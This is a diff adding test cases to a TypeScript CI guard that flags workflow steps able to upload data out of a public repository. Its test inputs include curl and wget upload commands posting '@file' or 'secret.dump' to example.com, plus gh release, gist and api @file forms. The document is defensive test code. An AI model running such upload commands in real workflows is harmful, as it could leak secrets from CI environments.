@@ -13,6 +13,7 @@ import {
   assertWorkspaceHasNoDataFiles,
   extractUploadArtifactSteps,
   findForbiddenUploadCommands,
+  isAtFileToken,
   lineLooksLikeCacheSave,
   lineLooksLikeGhApiInput,
   lineLooksLikeHttpUpload,
@@ -119,6 +120,88 @@ describe("public-repo CI guard", () => {
     expect(() =>
       assertWorkflowUploadAllowlist("run: wget --body-file=secret.dump https://example.com\n", "body.yml"),
     ).toThrow(/curl\/wget upload/);
+  });
+
+  it("rejects curl -d @file and --data-* @ forms", () => {
+    const cmds = [
+      "curl -d @file https://example.com",
+      'curl -d "@file" https://example.com',
+      "curl -d@file https://example.com",
+      "curl --data-binary @file https://example.com",
+      "curl --data-raw @file https://example.com",
+      "curl --data-urlencode @file https://example.com",
+      "curl --data-binary=@file https://example.com",
+      "curl --data-raw=@file https://example.com",
+      "curl --data-urlencode=@file https://example.com",
+    ];
+    for (const cmd of cmds) {
+      expect(lineLooksLikeHttpUpload(cmd), cmd).toBe(true);
+      expect(() => assertWorkflowUploadAllowlist(`run: ${cmd}\n`, "d.yml"), cmd).toThrow(
+        /curl\/wget upload/,
+      );
+    }
+    expect(isAtFileToken("@file")).toBe(true);
+    expect(isAtFileToken("-d@file")).toBe(true);
+    expect(isAtFileToken("x=@file")).toBe(true);
+    expect(isAtFileToken("user@host")).toBe(false);
+    expect(isAtFileToken("postgres@127.0.0.1")).toBe(false);
+    expect(isAtFileToken("email=a@b.com")).toBe(false);
+    expect(lineLooksLikeHttpUpload("curl -d email=a@b.com https://example.com")).toBe(false);
+  });
+
+  it("rejects gh release create files, gist, api @file, and third-party release actions", () => {
+    expect(findForbiddenUploadCommands("gh release create v1 secret.dump\n")).toEqual([
+      { line: 1, kind: "gh release create file" },
+    ]);
+    expect(findForbiddenUploadCommands("gh gist create secret.dump\n")).toEqual([
+      { line: 1, kind: "gh gist create" },
+    ]);
+    expect(findForbiddenUploadCommands("gh api -F x=@file repos/o/r\n")).toEqual([
+      { line: 1, kind: "gh @file" },
+    ]);
+    expect(findForbiddenUploadCommands("gh api -f x=@file repos/o/r\n")).toEqual([
+      { line: 1, kind: "gh @file" },
+    ]);
+    expect(findForbiddenUploadCommands('gh api -F "x=@file" repos/o/r\n')).toEqual([
+      { line: 1, kind: "gh @file" },
+    ]);
+    expect(() =>
+      assertWorkflowUploadAllowlist(
+        "uses: ncipollo/release-action@v1\n        with:\n          artifacts: secret.dump\n",
+        "ncipollo.yml",
+      ),
+    ).toThrow(/ncipollo\/release-action/);
+    expect(() =>
+      assertWorkflowUploadAllowlist(
+        "uses: svenstaro/upload-release-action@v2\n        with:\n          file: secret.dump\n",
+        "sven.yml",
+      ),
+    ).toThrow(/svenstaro\/upload-release-action/);
+    expect(() =>
+      assertWorkflowUploadAllowlist("run: gh release create v1 secret.dump\n", "create.yml"),
+    ).toThrow(/gh release create file/);
+    expect(() =>
+      assertWorkflowUploadAllowlist("run: gh gist create secret.dump\n", "gist.yml"),
+    ).toThrow(/gh gist create/);
+    expect(() =>
+      assertWorkflowUploadAllowlist("run: gh api -F x=@file repos/o/r\n", "field.yml"),
+    ).toThrow(/gh @file/);
+    // Desktop publish in release.yml: variables + known artifact names, not a dump.
+    expect(
+      findForbiddenUploadCommands(
+        [
+          'gh release create "$TAG" \\',
+          '  --repo "$RELEASES_REPO" \\',
+          '  --notes-file RELEASE_NOTES.md \\',
+          "  --latest \\",
+          '  "$DMG" "$STABLE_DMG" "$APPTAR" latest.json',
+          "",
+        ].join("\n"),
+      ),
+    ).toEqual([]);
+    expect(findForbiddenUploadCommands("gh api repos/o/r --method PUT --field content=$CONTENT\n")).toEqual(
+      [],
+    );
   });
 
   it("rejects gh api --input, action-gh-release, and cache save", () => {
@@ -231,6 +314,9 @@ describe("public-repo CI guard", () => {
     expect(workflow).toMatch(/id: guard/);
     expect(workflow).toMatch(/steps\.guard\.outcome == 'success'/);
     expect(workflow).toMatch(/--check-log/);
+    expect(workflow).toMatch(
+      /always\(\) && \(steps\.dump\.outcome == 'success' \|\| steps\.dump\.outcome == 'failure'\)/,
+    );
     expect(workflow).toMatch(/\|\s*tee "/);
     expect(workflow).toMatch(/shred/);
     expect(workflow).toMatch(/scripts\/guard-public-ci\.mjs --job/);
